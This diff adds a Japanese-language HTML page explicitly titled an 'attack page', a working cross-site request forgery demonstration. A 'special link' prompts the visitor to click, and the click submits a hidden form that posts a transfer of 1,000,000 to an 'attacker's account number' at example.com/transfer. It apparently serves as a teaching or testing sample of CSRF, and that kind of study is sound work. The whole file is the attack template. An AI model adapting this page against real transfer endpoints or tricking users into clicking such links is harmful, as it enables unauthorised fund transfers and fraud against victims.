@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>攻撃用ページ</title>
+  </head>
+  <body>
+    <h1>攻撃用ページ</h1>
+    <p>特別なリンクをクリックしてください。</p>
+    <a href="javascript:document.forms[0].submit()">特別なリンク</a>
+    <form method="post" action="https://example.com/transfer">
+      <input type="hidden" name="amount" value="1000000">
+      <input type="hidden" name="destination" value="攻撃者の口座番号">
+    </form>
+  </body>
+</html>
